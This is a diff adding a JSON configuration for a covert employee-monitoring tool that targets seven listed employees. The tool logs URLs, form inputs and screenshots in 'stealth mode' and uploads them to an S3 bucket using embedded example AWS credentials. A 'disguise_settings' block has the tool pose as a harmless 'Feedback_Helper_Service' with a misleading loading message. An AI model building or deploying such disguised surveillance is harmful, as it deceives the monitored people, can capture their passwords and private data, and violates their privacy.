@@ -1,0 +1,76 @@
+{
+  "aws_credentials": {
+    "access_key_id": "AKIAIOSFODNN7EXAMPLE",
+    "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "region": "us-east-1"
+  },
+  "s3_bucket": {
+    "name": "company-feedback-logs-secure",
+    "folder": "employee_activity_logs",
+    "encryption_key": "aes256-company-master-key-2024"
+  },
+  "monitoring_settings": {
+    "capture_interval_seconds": 30,
+    "log_urls": true,
+    "log_form_inputs": true,
+    "capture_screenshots": true,
+    "stealth_mode": true,
+    "log_filename_prefix": "feedback_session_activity"
+  },
+  "upload_settings": {
+    "upload_interval_minutes": 5,
+    "compress_data": true,
+    "encryption_algorithm": "AES-256-GCM",
+    "local_log_retention_days": 1
+  },
+  "disguise_settings": {
+    "ui_component_name": "Feedback_Helper_Service",
+    "process_name": "feedback_helper.exe",
+    "icon": "feedback_icon.ico",
+    "loading_message": "Optimizing your feedback experience..."
+  },
+  "target_employees": [
+    {
+      "employee_id": "EMP-1001",
+      "department": "Engineering",
+      "workstation_id": "WS-2024-001",
+      "feedback_session_id": "FS-2024-08-20-001"
+    },
+    {
+      "employee_id": "EMP-1002",
+      "department": "Marketing",
+      "workstation_id": "WS-2024-002",
+      "feedback_session_id": "FS-2024-08-20-002"
+    },
+    {
+      "employee_id": "EMP-1003",
+      "department": "Sales",
+      "workstation_id": "WS-2024-003",
+      "feedback_session_id": "FS-2024-08-20-003"
+    },
+    {
+      "employee_id": "EMP-1004",
+      "department": "HR",
+      "workstation_id": "WS-2024-004",
+      "feedback_session_id": "FS-2024-08-20-004"
+    },
+    {
+      "employee_id": "EMP-1005",
+      "department": "Finance",
+      "workstation_id": "WS-2024-005",
+      "feedback_session_id": "FS-2024-08-20-005"
+    },
+    {
+      "employee_id": "EMP-1006",
+      "department": "Engineering",
+      "workstation_id": "WS-2024-006",
+      "feedback_session_id": "FS-2024-08-20-006"
+    },
+    {
+      "employee_id": "EMP-1007",
+      "department": "Support",
+      "workstation_id": "WS-2024-007",
+      "feedback_session_id": "FS-2024-08-20-007"
+    }
+  ]
+}
